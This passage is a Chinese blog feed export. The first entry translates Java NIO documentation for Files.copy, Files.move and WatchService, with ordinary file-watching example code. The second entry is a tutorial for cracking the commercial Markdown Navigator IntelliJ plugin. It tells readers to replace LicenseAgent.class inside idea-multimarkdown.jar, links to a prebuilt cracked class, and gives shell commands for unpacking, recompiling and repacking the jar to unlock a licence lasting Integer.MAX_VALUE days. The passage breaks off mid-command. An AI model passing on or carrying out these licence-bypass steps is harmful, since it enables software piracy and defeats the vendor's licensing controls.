错误</li><li>FileAlreadyExistsException - 如果目标文件存在但由于未指定 <code>REPLACE_EXISTING</code> 选项而无法替换(可选的特定异常)</li><li>DirectoryNotEmptyException - 指定了 <code>REPLACE_EXISTING</code> 选项，但无法替换该文件，因为它是非空目录(可选的特定异常) *</li><li>UnsupportedOperationException - 如果选项包含不受支持的复制选项</li><li>SecurityException - 对于默认提供程序，并且安装了安全管理器，将调用 <code>checkWrite</code> 方法以检查对该文件的写访问权。如果指定了 <code>REPLACE_EXISTING</code> 选项，则会调用安全管理器的 <code>checkDelete</code> 方法来检查是否可以删除现有文件。</li></ul></li></ul><h5 id="public-static-long-copy-Path-source-OutputStream-out-throws-IOException"><a href="#public-static-long-copy-Path-source-OutputStream-out-throws-IOException" class="headerlink" title="public static long copy(Path source, OutputStream out) throws IOException"></a>public static long copy(Path source, OutputStream out) throws IOException</h5><p>将<strong>文件中的</strong>所有字节复制到输出流。</p><p>如果从文件读取或写入输出流时发生 I/O 错误，则可能在读取或写入某些字节后执行此操作。因此，输出流可能处于不一致状态。如果发生I / O错误，强烈建议立即关闭输出流。</p><p>此方法可能会无限期地阻止写入输出流(或从文件中读取)。在复制期间输出流异步关闭或线程中断的行为是由输出流和文件系统提供程序指定的，因此未指定。</p><p>请注意，如果给定的输出流是 <code>Flushable</code>，则在此方法完成后可能需要调用其 <code>flush</code>方法，以便刷新任何缓冲的输出。</p><ul><li>Parameters:<ul><li>source - 原文件的路径</li><li>out - 要写入的输出流</li></ul></li><li>Returns: 读取或写入的字节数</li><li>Throws:<ul><li>IOException - 如果读取或写入时发生 I/O 错误</li><li>SecurityException - 对于默认提供程序，并且安装了安全管理器，将调用 <code>checkRead</code> 方法以检查对该文件的读访问权。</li></ul></li></ul><h5 id="public-static-Path-copy-Path-source-Path-target-CopyOption…-options-throws-IOException"><a href="#public-static-Path-copy-Path-source-Path-target-CopyOption…-options-throws-IOException" class="headerlink" title="public static Path copy(Path source, Path target, CopyOption… options) throws IOException"></a>public static Path copy(Path source, Path target, CopyOption… options) throws IOException</h5><p>将文件复制到目标文件。</p><p>此方法使用 <code>options</code> 参数将文件复制到目标文件，该参数指定如何执行复制。默认情况下，如果目标文件已存在或者是符号链接，则复制将失败，除非源和目标是同一文件，在这种情况下，方法完成但不是复制文件。</p><p>不需要将文件属性复制到目标文件。 如果支持符号链接，并且文件是符号链接，则复制链接的原始目标。如果文件是目录，则它在目标位置创建一个空目录（不复制目录中的条目）。此方法可与 <code>walkFileTree</code> 方法一起使用，以复制目录和目录中的所有条目，或者复制所需的整个文件树。</p><p>options 参数可以包括以下任何一项：</p><table><thead><tr><th align="center">Option</th><th align="left">Description</th></tr></thead><tbody><tr><td align="center">REPLACE_EXISTING</td><td align="left">如果目标文件存在，则如果目标文件不是非空目录，则替换目标文件。如果目标文件存在且是符号链接，则替换符号链接本身而不是链接的目标。</td></tr><tr><td align="center">COPY_ATTRIBUTES</td><td align="left">尝试将与此文件关联的文件属性复制到目标文件。复制的确切文件属性是与平台和文件系统相关的，因此未指定。最小化，如果源文件存储和目标文件存储都支持，则将最后修改时间复制到目标文件。复制文件时间戳可能会导致精度损失。</td></tr><tr><td align="center">NOFOLLOW_LINKS</td><td align="left">不遵循符号链接。如果文件是符号链接，则复制符号链接本身，而不是链接的目标。如果可以将文件属性复制到新链接，则它是特定于实现的。换句话说，复制符号链接时可以忽略 <code>COPY_ATTRIBUTES</code> 选项。</td></tr></tbody></table><p>此接口的实现可以支持其他特定于实现的选项。</p><p>复制文件不是原子操作。如果抛出 IOException，则可能是目标文件不完整或者某些文件属性尚未从源文件复制。如果指定了 <code>REPLACE_EXISTING</code> 选项且目标文件存在，则替换目标文件。对于其他文件系统活动，检查文件是否存在以及创建新文件可能不是原子的。</p><p>示例：假设我们要将文件复制到目录中，并为其提供与源文件相同的文件名:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Path</span> source <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">Path</span> newdir <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> newdir<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>source<span class="token punctuation">.</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>Parameters:<ul><li>source - 要复制的文件的路径</li><li>target - 目标文件的路径(可能与源路径的不同提供者相关联)</li><li>options - 指定副本应如何完成的选项</li></ul></li><li>Returns: 目标文件的路径</li><li>Throws:<ul><li>UnsupportedOperationException - 如果数组包含不受支持的副本选项</li><li>FileAlreadyExistsException - 如果目标文件存在但由于未指定 <code>REPLACE_EXISTING</code> 选项而无法替换(可选的特定异常)</li><li>DirectoryNotEmptyException - 指定了 <code>REPLACE_EXISTING</code> 选项，但无法替换该文件，因为它是非空目录(可选的特定异常)</li><li>IOException - 如果发生 I/O 错误</li><li>SecurityException - 对于默认提供程序，并且安装了安全管理器，调用 <code>checkRead</code> 方法以检查对源文件的读访问权，调用 <code>checkWrite</code> 以检查对目标文件的写访问权。如果复制了符号链接，则调用安全管理器以检查 <code>java.nio.file.LinkPermission</code>（用于链接创建操作的权限类。）。</li></ul></li></ul><h4 id="Files-move"><a href="#Files-move" class="headerlink" title="Files.move"></a>Files.move</h4><p>将文件移动或重命名为目标文件。</p><p>默认情况下，此方法尝试将文件移动到目标文件，如果目标文件存在则失败，除非源文件和目标是同一文件，在这种情况下此方法实际上是无效的。如果文件是符号链接，则移动符号链接本身而不是原文件。可以调用此方法来移动空目录。在一些实现中，目录具有用于创建目录时创建的特殊文件或链接的条目。在这样的实现中，当仅存在特殊条目时，目录被认为是空的。</p><p>当调用移动非空目录时，如果不需要移动目录中的条目，则移动目录。例如，重命名同一 FileStore 上的目录通常不需要移动目录中的条目。</p><p>若移动目录时需要移动其条目，则此方法失败(通过抛出 IOException)。移动文件树可能涉及复制而不是移动目录，这可以使用 <a href="#Files-copy"><code>Files.copy</code> 方法</a>与 <code>Files.walkFileTree</code> 实用程序方法一起完成。</p><p>options 参数可以包括以下任何一项：</p><table><thead><tr><th align="center">Option</th><th align="left">Description</th></tr></thead><tbody><tr><td align="center">REPLACE_EXISTING</td><td align="left">如果目标文件存在，则如果目标文件不是非空目录，则替换目标文件。 如果目标文件存在且是符号链接，则替换符号链接本身而不是原文件。</td></tr><tr><td align="center">ATOMIC_MOVE</td><td align="left">移动作为原子文件系统操作执行，并忽略所有其他选项。如果目标文件已存在，则它成功与否取决于是否已替换已存在的文件或由于该方法抛出 IOException 而失败。如果移动无法作为原子文件系统操作执行，则抛出 AtomicMoveNotSupportedException。例如，当目标位置位于不同的 FileStore 上并且需要复制文件，或者目标位置与该对象的不同提供者相关联时，可能会出现这种情况。</td></tr></tbody></table><p>此接口的实现可以支持其他特定于实现的选项。</p><p>如果移动要求复制文件，则将最后修改时间复制到新文件。该实现还会尝试复制其他文件属性，但如果无法复制文件属性，则并不会失败。当移动作为非原子操作执行并且抛出 IOException 时，则文件的状态不确定。原始文件和目标文件都可能存在，目标文件可能不完整或者某些文件属性可能未从原始文件中复制。</p><p>示例：假设我们要将文件重命名为 “newname”，将文件保留在同一目录中:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Path</span> source <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">move</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">resolveSibling</span><span class="token punctuation">(</span><span class="token string">"newname"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者，假设我们要将文件移动到新目录，保留相同的文件名，并替换目录中该名称的任何现有文件:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Path</span> source <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">Path</span> newdir <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">move</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> newdir<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>source<span class="token punctuation">.</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">REPLACE_EXISTING</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>public static Path move(Path source, Path target, CopyOption… options) throws IOException</li><li>Parameters:<ul><li>source - 要移动的文件的路径</li><li>target - 目标文件的路径(可能与源路径的不同提供者相关联)</li><li>options - 指定应如何进行移动的选项</li></ul></li><li>Returns: 目标文件的路径</li><li>Throws:<ul><li>UnsupportedOperationException - 如果数组包含不受支持的副本选项</li><li>FileAlreadyExistsException - 如果目标文件存在但由于未指定 <code>REPLACE_EXISTING</code> 选项而无法替换(可选的特定异常)</li><li>DirectoryNotEmptyException - 指定了 <code>REPLACE_EXISTING</code> 选项，但无法替换该文件，因为它是非空目录(可选的特定异常)</li><li>AtomicMoveNotSupportedException - 如果 <code>options</code> 数组包含 <code>ATOMIC_MOVE</code> 选项但该文件不能作为原子文件系统操作移动。</li><li>IOException - 如果发生 I/O 错误</li><li>SecurityException - 对于默认提供程序，并且安装了安全管理器，将调用 <code>checkWrite</code> 方法以检查对源文件和目标文件的写访问权。</li></ul></li></ul><blockquote><p>使用 Files 类型来管理文件，相对于传统的 I/O 方式来说更加方便和简单。因为具体的操作实现将全部移交给 NIO 2.0 API，开发人员则无需关注。</p><p>这里只介绍几个常用方法，其他 Files 接口方法请看 JDK 7 文档</p></blockquote><h3 id="WatchService-接口"><a href="#WatchService-接口" class="headerlink" title="WatchService 接口"></a>WatchService 接口</h3><p>监视已注册对象的更改和事件的监视服务。例如，文件管理器可以使用监视服务来监视目录以进行更改，以便在创建或删除文件时它可以更新其文件列表的显示。</p><p><code>java.nio.file.Watchable</code> 对象通过调用其 <code>register</code> 方法向 watch 服务注册，返回 WatchKey 来表示注册。当检测到某个对象的事件时，就会发出密钥的信号，如果当前没有发出信号，则将其排队到 watch 服务，以便被<a href="#poll">调用 <code>poll</code></a> 或 <a href="#take"><code>take</code> 方法</a>的消费者检索到并处理该事件。一旦事件被处理完毕，消费者就会调用关键字的 <code>reset</code> 方法来重置关键字，该密钥允许向密钥发出信号，并通过进一步的事件重新排队。</p><p>通过调用密钥的 <code>cancel</code> 方法取消注册监视服务。取消时排队的密钥将保留在队列中，直到被检索为止。根据对象，秘钥可能会自动取消。例如，假设监视目录并且监视服务检测到它已被删除或其文件系统不再可访问。当以这种方式取消密钥时，如果当前未发出信号，则发信号通知并排队。为了确保通知消费者，<code>reset</code> 方法的返回值指示密钥是否有效。</p><p>多个并发消费者可以安全地使用监视服务。要确保只有一个使用者可以随时处理特定对象的事件，那么应该注意确保仅在处理事件之后调用密钥的 <code>cancel</code> 方法。可以随时调用 <code>close</code> 方法来关闭服务，但是会导致任何等待检索键的线程抛出 ClosedWatchServiceException。</p><p>文件系统可以比检索或处理事件更快地报告事件，并且该实现可以对其可能累积的事件的数量施加未指定的限制。如果该实现有意丢弃事件，那么它会安排密钥的 <code>pollEvents</code> 方法返回事件类型为 <code>OVERFLOW</code> 的元素。消费者可以将此事件用作重新检查对象状态的触发器。</p><p>当报告事件以指示已监视目录中的文件已被修改时，则无法保证已修改该文件的程序(或多个程序)已完成。应注意协调与可能正在更新文件的其他程序的访问。FileChannel 类定义了锁定文件区域以防其他程序访问的方法。</p><blockquote><p>平台依赖</p><p>观察来自文件系统的事件的实现旨在直接映射到可用的本机文件事件通知工具，或者在本机工具不可用时使用原始机制(例如轮询)。因此，关于如何检测事件，及时性以及是否保留其排序的许多细节都是高度取决于实现的。例如，当修改监视目录中的文件时，它可能在某些实现中导致单个 <code>ENTRY_MODIFY</code> 事件，但在其他实现中会导致多个事件。短期文件(意味着在创建文件后很快删除的文件)可能无法被定期轮询文件系统以检测更改的原始实现检测到。</p><p>如果监视文件不在本地存储设备上，则如果可以检测到对文件的更改，则它是取决于实现的。特别是，不需要检测对远程系统上执行的文件的更改。</p></blockquote><h4 id="close"><a href="#close" class="headerlink" title="close"></a>close</h4><p>关闭此监视服务</p><p>如果某个线程当前在 <a href="#take"><code>take</code></a> 或 <a href="#poll"><code>poll</code> 方法</a>中被阻塞，等待一个键排队，那么它会立即收到一个 ClosedWatchServiceException。与此监视服务关联的任何有效密钥均无效。</p><p>关闭监视服务后，任何进一步尝试调用它的操作都将抛出 ClosedWatchServiceException。如果此监视服务已关闭，则调用此方法无效。</p><ul><li>void close() throws IOException</li><li>参见：<a href="#try-%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E5%85%B3%E9%97%AD%E8%B5%84%E6%BA%90"><code>AutoCloseable.close</code> 和 <code>Closeable.close</code></a></li><li>Throws: IOException - 如果发生 I/O 错误</li></ul><h4 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h4><p>检索并删除下一个监视密钥，如果不存在，则返回 null</p><ul><li>WatchKey poll()</li><li>Returns: 下一个监视键，或 null</li><li>Throws: ClosedWatchServiceException - 如果此监视服务已关闭</li></ul><h4 id="poll-1"><a href="#poll-1" class="headerlink" title="poll"></a>poll</h4><p>检索并删除下一个监视密钥，必要时等待指定的等待时间(如果尚未存在)。</p><ul><li>WatchKey poll(long timeout, TimeUnit unit) throws InterruptedException</li><li>Parameters:<ul><li>timeout - 放弃之前的等待时间，单位以 unit 参数为准</li><li>unit - TimeUnit 设置超时参数</li></ul></li><li>Returns: 下一个监视键，或 null</li><li>Throws:<ul><li>ClosedWatchServiceException - 如果此监视服务已关闭，或在等待下一个键时关闭</li><li>InterruptedException - 如果在等待时被打断</li></ul></li></ul><h4 id="take"><a href="#take" class="headerlink" title="take"></a>take</h4><p>检索并删除下一个监视密钥，如果还没有，则等待</p><ul><li>WatchKey take() throws InterruptedException</li><li>Returns: 下一个监视秘钥</li><li>Throws:<ul><li>ClosedWatchServiceException - 如果此监视服务已关闭，或在等待下一个键时关闭</li><li>InterruptedException - 如果在等待时被打断</li></ul></li></ul><p>在此或许有很多朋友并不知晓文件监测有何意义及目，那么请大家回想下调试成热发布功能后的 Web 容器。当项目迭代后并重新部署时，开发人员无需对其进行手动重启，因为 Web 容器一旦监测到文件发生改变后，便会自动去适应这些“变化”并重新进行内部装载。Web 容器的热发布功能同样也是基于文件监测功能，所以不得不承认，文件监测功能的出现对于 Java 文件系统来说是具有重大意义的。</p><p>文件监测是基于事件驱动的，事件触发是作为监测的先决条件。开发人员可以使用 <code>java.nio.file.StandardWatchEventKinds</code> 类提供的 3 种字面常量来定义监测事件类型，值得注意的是监测事件需要和 WatchService 实例一起进行注册。</p><p>StandardWatchEventKinds 类提供的监测事件：</p><ul><li>ENTRY_CREATE：文件或文件夹新建事件；</li><li>ENTRY_DELETE：文件或文件夹删除事件；</li><li>ENTRY_MODIFY：文件或文件夹粘贴事件；</li></ul><p>使用 WatchService 类实现文件监控示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">FileSystems</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">StandardWatchEventKinds</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">WatchEvent</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">WatchKey</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">WatchService</span></span><span class="token punctuation">;</span><span class="token comment">/*** 文件监控系统* @author huangjiawei*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WatchViewTest</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">testWatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment">/* 监控目标路径 */</span>      <span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\huangjiawei\\Desktop"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token comment">/* 创建文件监控对象. */</span>          <span class="token class-name">WatchService</span> watchService <span class="token operator">=</span> <span class="token class-name">FileSystems</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newWatchService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">/* 注册文件监控的所有事件类型. */</span>          path<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>watchService<span class="token punctuation">,</span> <span class="token class-name">StandardWatchEventKinds</span><span class="token punctuation">.</span><span class="token constant">ENTRY_CREATE</span><span class="token punctuation">,</span> <span class="token class-name">StandardWatchEventKinds</span><span class="token punctuation">.</span><span class="token constant">ENTRY_DELETE</span><span class="token punctuation">,</span>                  <span class="token class-name">StandardWatchEventKinds</span><span class="token punctuation">.</span><span class="token constant">ENTRY_MODIFY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">/* 循环监测文件. */</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token class-name">WatchKey</span> watchKey <span class="token operator">=</span> watchService<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">/* 迭代触发事件的所有文件 */</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">WatchEvent</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> event <span class="token operator">:</span> watchKey<span class="token punctuation">.</span><span class="token function">pollEvents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">context</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 事件类型："</span> <span class="token operator">+</span> event<span class="token punctuation">.</span><span class="token function">kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>watchKey<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token keyword">return</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>          e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">testWatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上述程序示例我们可以看出，使用 WatchService 接口进行文件监控非常简单和方便。首先我们需要定义好目标监控路径，然后调用 FileSystems 类型的 <code>newWatchService()</code> 方法创建 WatchService 对象。接下来我们还需使用 Path 接口的 <code>register()</code> 方法注册 WatchService 实例及监控事件。当这些基础作业层全部准备好后，我们再编写外围实时监测循环。最后迭代 WatchKey 来获取所有触发监控事件的文件即可。</p><!--现在我终于知道，spring boot 中那个所谓的 dev-tools 热更新的基本原理啦！原来 JDK 都有提供这样的 API。-->]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>破解 Markdown Navigator</title>
      <link href="/2018/12/18/markdownnavigatorcrack/"/>
      <url>/2018/12/18/markdownnavigatorcrack/</url>
      
        <content type="html"><![CDATA[<p>用了好久的 <code>2.3.8</code> 版本，一直懒得更新，今儿不小心把插件删了…然后发现之前参考的链接失效了…</p><p>哎，自己重新破解一遍吧…</p><span id="more"></span><h2 id="安装-Markdown-Navigator-插件"><a href="#安装-Markdown-Navigator-插件" class="headerlink" title="安装 Markdown Navigator 插件"></a>安装 Markdown Navigator 插件</h2><p>这个不解释了，安装啥插件都一样，自己谷歌下。</p><h2 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h2><p>将 <a href="https://github.com/CrazyBunQnQ/multimarkdown/releases/tag/2.7.0"><code>LicenseAgent.class</code> 文件</a>拷贝到 Markdown Navigator 插件安装目录 <code>/lib/idea-multimarkdown.jar</code> 包中的 <code>com.vladsch\idea\multimarkdown\license</code> 目录下，覆盖原有的 <code>LicenseAgent.class</code> 文件</p><blockquote><p>具体修改方法、内容感兴趣的可以看后面的<a href="#%E7%A0%B4%E8%A7%A3%E5%85%A8%E8%BF%87%E7%A8%8B">详细破解方法</a>和 <a href="https://github.com/CrazyBunQnQ/multimarkdown"><code>LicenseAgent.java</code> 注释</a></p></blockquote><h3 id="Windows-下推荐使用-Everything-搜索-“idea-multimarkdown-jar”，全盘秒搜"><a href="#Windows-下推荐使用-Everything-搜索-“idea-multimarkdown-jar”，全盘秒搜" class="headerlink" title="Windows 下推荐使用 Everything 搜索 “idea-multimarkdown.jar”，全盘秒搜"></a>Windows 下推荐使用 Everything 搜索 “idea-multimarkdown.jar”，全盘秒搜</h3><p><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fggjp1tee6j20oc07smxl.jpg" alt="Everything"></p><h3 id="使用压缩工具打开-idea-multimarkdown-jar-按下图所示替换-class-文件即可"><a href="#使用压缩工具打开-idea-multimarkdown-jar-按下图所示替换-class-文件即可" class="headerlink" title="使用压缩工具打开 idea-multimarkdown.jar 按下图所示替换 .class 文件即可"></a>使用压缩工具打开 <code>idea-multimarkdown.jar</code> 按下图所示替换 .class 文件即可</h3><p><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1fggjp25549j20mr0el40o.jpg" alt="替换 class 文件"></p><p>完成上面的操作后重启 IDEA 即可。</p><p><strong>替换后一定要确认下被替换的 .class 文件修改时间与其他文件修改时间不同。</strong></p><p><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fgglx44looj20ps091abm.jpg" alt="确认替换成功"></p><h2 id="Mac-系统破解插件"><a href="#Mac-系统破解插件" class="headerlink" title="Mac 系统破解插件"></a>Mac 系统破解插件</h2><p>打开终端输入命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/Library/Application<span class="token punctuation">\</span> Support<span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>根据查到的 IDEA 版本文件夹，继续输入下面的命令进入插件目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> IntelliJIdea2017.1/idea-multimarkdown<span class="token function">open</span> lib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输入完上述指令后会弹出插件目录，将修改好的 multimarkdown.jar 文件替换进去，重启 IDEA 即可，如图：</p><p><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fggoxvajfnj21b61hie2s.jpg" alt="替换 jar 包"></p><h2 id="附：破解成功后的截图"><a href="#附：破解成功后的截图" class="headerlink" title="附：破解成功后的截图"></a>附：破解成功后的截图</h2><p>解锁全部姿势:</p><p><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fgh5r3ktnrj21ec0cftc9.jpg" alt="顶部菜单"></p><p><img src="http://wx4.sinaimg.cn/large/a6e9cb00ly1fzpwqwjxmqj20u00uwap1.jpg" alt="破解成功"></p><blockquote><p>这个天数，哈哈哈，设置 <code>Integer.MAX_VALUE</code> 是不是有点高了。。。</p></blockquote><h2 id="破解全过程"><a href="#破解全过程" class="headerlink" title="破解全过程"></a>破解全过程</h2><blockquote><p>默认你已经安装好插件了</p><p><code>x</code> 为你的 IDEA 版本</p></blockquote><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><blockquote><p>实际直接克隆此项目即可<br>以下路径根据自己电脑情况有所变化</p></blockquote><p>创建项目时必须创建 <code>com.vladsch.idea.multimarkdown.license</code> 包，与原始 jar 包中的结构一致</p><h3 id="修改文件-1"><a href="#修改文件-1" class="headerlink" title="修改文件"></a>修改文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. 将安装好的插件拷贝出来，并保存为 `idea-multimarkdown.bak.jar` 作为备份</span><span class="token builtin class-name">cd</span> 你的项目目录<span class="token function">cp</span> ~/Library/Application<span class="token punctuation">\</span> Support/IntelliJIdea2018.x/idea-multimarkdown/lib/idea-multimarkdown.jar ./releases/2.7.0/idea-multimarkdown.bak.jar<span class="token comment"># 2. 解压插件</span><span class="token builtin class-name">cd</span> releases/2.7.0<span class="token comment"># 解压到 source 文件夹(没找到解压到指定文件夹的参数...)</span><span class="token function">cp</span> idea-multimarkdown.bak.jar ./source/<span class="token builtin class-name">cd</span> <span class="token builtin class-name">source</span>jar xvf idea-multimarkdown.bak.jar <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> <span class="token parameter variable">-f</span> idea-multimarkdown.bak.jar<span class="token comment"># 将要修改的 LicenseAgent.java 拷贝到上面创建的包里</span><span class="token builtin class-name">cd</span> 你的项目目录<span class="token function">cp</span> releases/2.7.0/source/com/vladsch/idea/multimarkdown/license/LicenseAgent.java src/com/vladsch/idea/multimarkdown/license/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编译文件"><a href="#编译文件" class="headerlink" title="编译文件"></a>编译文件</h3><p>打开 <code>LicenseAgent.java</code> 文件你会发现很多报错，无法编译，是因为没有依赖包</p><p>编译前首先需要引入 IDEA 和 multimarkdown 的依赖包</p><p>IDEA 依赖包在 IDEA 安装目录中</p><p><img src="http://wx4.sinaimg.cn/large/a6e9cb00ly1fzpvgamo4nj213w0aidhp.jpg" alt="IDEA 依赖包"></p><p>multimarkdown 的依赖包在该插件目录中</p><p><img src="http://wx2.sinaimg.cn/large/a6e9cb00ly1fzpvinslyfj21j00a80v1.jpg" alt="multimarkdown 依赖包"></p><blockquote><p>路径参考图中路径</p></blockquote><p>导入依赖后菜单 <code>Build</code> → <code>Build Project</code> 编译项目</p><p>然后会生成 out 目录，编译好的 <code>.class</code> 文件就在这里</p><h3 id="重新打包"><a href="#重新打包" class="headerlink" title="重新打包"></a>重新打包</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> 